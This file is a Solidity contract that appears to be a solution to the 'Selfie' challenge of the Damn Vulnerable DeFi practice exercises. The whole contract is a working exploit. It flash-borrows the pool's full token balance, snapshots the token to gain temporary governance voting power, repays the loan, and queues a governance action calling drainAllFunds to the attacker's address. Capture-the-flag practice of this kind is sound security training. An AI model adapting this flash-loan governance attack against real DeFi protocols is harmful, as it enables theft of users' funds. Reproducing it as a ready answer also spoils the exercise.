// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    uint256 public actionId;
    address attacker;

    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableTokenSnapshot _token
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
        attacker = msg.sender;
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(address, uint256 borrowedAmount) external {
        token.snapshot();
        token.transfer(address(pool), borrowedAmount);
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
    }
}
